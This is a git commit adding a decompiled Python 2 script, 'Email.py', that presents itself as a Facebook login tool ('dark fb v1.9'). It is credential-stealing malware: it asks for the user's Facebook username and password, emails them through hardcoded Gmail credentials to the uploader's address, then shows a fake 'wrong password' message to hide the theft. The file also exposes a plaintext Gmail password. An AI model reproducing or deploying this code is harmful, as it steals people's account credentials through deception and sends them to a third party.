9c188a537704a094d17f65fa22a3591b7e844bc5
wedusganteng <63887769+wedusganteng@users.noreply.github.com>
2020-07-12 00:14:14 +0700

    Add files via upload

---
+++ Email.py
@@ -0,0 +1,49 @@
+# Decompiled By RandiSr
+# Github : https://github.com/RANDIOLOY
+# uncompyle6 version 3.7.2
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: dg
+import socket, struct, os, sys, time, yagmail, random
+time.sleep(2)
+os.system('clear')
+time.sleep(3)
+x = yagmail.SMTP('tobeltobel40@gmail.com', '1230987@')
+subject = 'Robot Mr.Zck18'
+print '\x1b[92m        _            _       __ _   '
+print '     __| | __ _ _ __| | __  / _| |__ '
+print "    / _` |/ _` | '__| |/ / | |_| '_ \\ "
+print '   | (_| | (_| | |  |   <  |  _| |_) | '
+print '    \\__,_|\\__,_|_|  |_|\\_\\ |_| |_.__/  \x1b[93mv1.9\x1b[97m'
+print ''
+print '    \x1b[93m*  \x1b[97mAUTHOR  \x1b[91m: \x1b[96m./cok18 '
+print '    \x1b[93m*  \x1b[97mTEAM    \x1b[91m: \x1b[92mX-CORE '
+print '    \x1b[93m*  \x1b[97mSupport \x1b[91m: \x1b[94mMr.Zck18 '
+print '\x1b[97m'
+print '==============================================='
+print ''
+print '          \x1b[91m[~] \x1b[92mLOGIN AKUN FACEBOOK \x1b[91m[~] '
+u = raw_input(' [\x1b[92m+\x1b[91m] \x1b[96mUsername \x1b[91m: \x1b[97m')
+p = raw_input(' \x1b[91m[\x1b[92m+\x1b[91m] \x1b[96mPassword \x1b[91m: \x1b[97m')
+msg = 'username : ' + u + ', password : ' + p
+body = msg
+x.send('wedusganteng56@gmail.com', subject, body)
+
+def jalan(ilham):
+    for e in ilham:
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
+time.sleep(0.1)
+print ' \x1b[91m[\x1b[92m-\x1b[91m] \x1b[93mLoading '
+jalan(' \x1b[91m[\x1b[92m+\x1b[91m]\x1b[97m Login . . . . .\n')
+time.sleep(3)
+print ' \x1b[91m[x] \x1b[91mUsername Atau Password Salah !!!'
+print ''
+time.sleep(2)
+print ' \x1b[92m[\x1b[91m!\x1b[92m] \x1b[97mHarap Masukkan Username dan Password Dengan Benar'
+time.sleep(2)
+print ' \x1b[91m[\x1b[92m?\x1b[91m] \x1b[97mKeluar Program '
